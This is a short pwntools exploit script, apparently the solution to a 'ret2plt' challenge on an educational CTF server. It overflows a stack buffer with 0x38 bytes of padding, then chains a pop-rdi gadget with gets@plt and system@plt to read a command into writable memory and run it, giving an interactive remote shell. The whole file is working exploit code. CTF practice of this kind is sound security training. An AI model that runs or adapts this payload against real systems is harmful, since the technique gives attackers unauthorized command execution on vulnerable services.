#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
binary = remote('edu-ctf.csie.org', 10174)
#binary = process('./ret2plt')
#pause()
# pause so that gdb can attach to this process

pop_rdi = 0x400733
gets_plt = 0x400530
system_plt = 0x400520
writable_mem = 0x601080

payload = b'a' * (0x30 + 8)
payload += p64(pop_rdi)
payload += p64(writable_mem)
payload += p64(gets_plt)
payload += p64(pop_rdi)
payload += p64(writable_mem)
payload += p64(system_plt)


binary.sendlineafter(":D", payload)
#inary.sendline("sh")

binary.interactive()
